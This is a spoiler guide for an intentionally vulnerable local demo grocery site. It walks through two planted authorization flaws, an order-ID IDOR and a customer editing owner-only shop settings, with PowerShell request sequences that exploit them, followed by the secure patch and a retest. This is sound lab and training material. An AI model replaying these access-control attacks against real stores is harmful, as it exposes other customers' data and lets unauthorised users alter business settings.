# SPOILERS: Reveal, reproduce, fix, and reproduce again

Read this **after** you've tried CanTheySeeIt? on the regular-looking grocery website.

Both vulnerabilities are **intentional** and only apply to the local synthetic demo at `http://127.0.0.1:4000`. They were placed in a *server-side policy module*, not as buttons or hints on the frontend.

## Bug 1 — Broken Object-Level Authorization (BOLA / IDOR)

**Customer A can view Customer B's private order if they know its ID.**

The normal **My orders** list correctly filters orders by current customer. However, the separate `GET /api/orders/:orderId` route currently checks only that the requester is logged in, not that the order belongs to them.

- A's seeded order: `order-a-1001` (marker `ORDER_A_PRIVATE_71C9`).
- B's seeded order: `order-b-1002` (marker `ORDER_B_PRIVATE_48D2`).
- Correct policy: A requesting `order-b-1002` should return `403 Forbidden`.
- Vulnerable observation: HTTP `200` and `ownerUserId: customer-b` plus B's exact private marker.

### Reproduce Bug 1 in PowerShell

In your **first** VS Code terminal, start the shop:

```powershell
npm.cmd start
```

In a **second** terminal, obtain a disposable token for Alice:

```powershell
$Base = 'http://127.0.0.1:4000'
$Login = @{ email='alice@sprout.local'; password='AppleA!26' } | ConvertTo-Json
$Alice = (Invoke-RestMethod -Uri "$Base/api/auth/token" -Method Post -ContentType 'application/json' -Body $Login).token
$Headers = @{ Authorization = "Bearer $Alice" }
```

The legitimate list contains **only A's orders**:

```powershell
(Invoke-RestMethod -Uri "$Base/api/orders" -Headers $Headers).orders | Select-Object orderId,ownerUserId
```

But the direct detail endpoint incorrectly exposes B's record:

```powershell
(Invoke-RestMethod -Uri "$Base/api/orders/order-b-1002" -Headers $Headers).order | Select-Object orderId,ownerUserId,privateMarker
```

**What your verifier must assert:** A's identity is valid, B's record is real, the response contains B's correct protected owner/ID/marker, therefore **FAIL** — not merely because HTTP `200` was observed.

## Bug 2 — Broken Function-Level Authorization (admin settings edit)

**Customer B can change the shopkeeper's contact information even though the shop-management UI is only available to the owner.**

The `GET /api/shop/settings` route correctly restricts reads to the owner. However, the `PATCH /api/shop/settings` route uses an insufficient role check. This is a business-action authorization vulnerability, not a front-end navigation issue.

### Reproduce Bug 2 in PowerShell

Continuing in the second terminal:

```powershell
$OwnerLogin = @{ email='owner@sprout.local'; password='OwnerDemo!26' } | ConvertTo-Json
$OwnerToken = (Invoke-RestMethod -Uri "$Base/api/auth/token" -Method Post -ContentType 'application/json' -Body $OwnerLogin).token
$OwnerHeaders = @{ Authorization = "Bearer $OwnerToken" }
$BobLogin = @{ email='bob@sprout.local'; password='BerryB!26' } | ConvertTo-Json
$BobToken = (Invoke-RestMethod -Uri "$Base/api/auth/token" -Method Post -ContentType 'application/json' -Body $BobLogin).token
$BobHeaders = @{ Authorization = "Bearer $BobToken" }
```

Record the original contact email (owner privileges):

```powershell
(Invoke-RestMethod -Uri "$Base/api/shop/settings" -Headers $OwnerHeaders).settings.supportEmail
```

Now, **as Customer B**, update an owner-only field:

```powershell
$Change = @{ supportEmail='unauthorised-lab-edit@sprout.local' } | ConvertTo-Json
Invoke-RestMethod -Uri "$Base/api/shop/settings" -Method Patch -Headers $BobHeaders -ContentType 'application/json' -Body $Change
```

Re-read the settings with the owner's session:

```powershell
(Invoke-RestMethod -Uri "$Base/api/shop/settings" -Headers $OwnerHeaders).settings.supportEmail
```

The contact email has been modified by a customer. **The verifier should flag FAIL.**

**Reset the disposable records:**

```powershell
Invoke-RestMethod -Uri "$Base/api/lab/reset" -Method Post -Headers $OwnerHeaders -ContentType 'application/json' -Body '{}'
```

### One-command alternative

From the project root, with the server running, launch:

```powershell
powershell.exe -ExecutionPolicy Bypass -File .\scripts\reproduce-bugs.ps1
```

This script shows both issues and resets synthetic data. You can instead run the cross-platform verification report:

```powershell
npm.cmd run verify
```

The starting variant should print **FAIL** overall, signifying confirmed vulnerabilities (which means successful *detection* by the checker).

## Show a genuine secure code change, then retest

1. Stop the server with `Ctrl+C`.
2. Replace the access policy file with the corrected version:

```powershell
Copy-Item .\patches\access.secure.mjs .\src\access.mjs -Force
npm.cmd start
```

3. In a second terminal:

```powershell
npm.cmd run verify
```

The checker should report **PASS** for the three supported checks. Alice's own-order read remains allowed, while a customer can no longer read another customer's order or modify shopkeeper settings.

**Recreate the original bugs** with an actual source change:

```powershell
# Stop the server first (Ctrl+C)
Copy-Item .\patches\access.vulnerable.mjs .\src\access.mjs -Force
npm.cmd start
```

Then rerun `npm.cmd run verify` — the result should return to **FAIL**. Neither the UI nor a revision label controls the verdict.

**Note:** `npm.cmd test` includes acceptance cases that expect the original intentionally vulnerable behaviour, so after applying the fix those specific detection-fixture assertions will fail. This is expected. Use `npm.cmd run verify` as the **mode-independent** security verdict demonstration.

## Why the bugs are non-obvious to a regular customer

- The UI displays only the customer's own orders, obtained from the correctly filtered list endpoint. The vulnerable *detail* route is only visible when an unauthorized direct ID is requested.
- Customer navigation never displays the owner's settings screen; the mistake exists because a server-side PATCH handler does not enforce the owner role.
- On the fixed version both behaviors change due to actual server-side permission checks. No fake dashboard flags, hard-coded verdicts or misleading result toggles are involved.

## Practical ethical boundary

Use only the local instance and three synthetic accounts provided. Do not repeat these requests against a real store or a public third-party target without explicit written authorization.
